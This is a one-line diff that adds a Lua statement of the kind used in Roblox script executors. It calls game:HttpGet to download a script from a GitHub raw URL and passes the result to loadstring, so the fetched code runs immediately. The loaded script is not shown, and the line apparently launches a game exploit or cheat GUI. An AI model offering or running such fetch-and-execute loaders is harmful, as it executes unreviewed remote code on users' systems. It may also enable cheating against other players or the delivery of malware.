@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/CaseohCASEOH/Gui/refs/heads/main/DO_NOT_TRY_SKID_MY_SCRIPT'))()
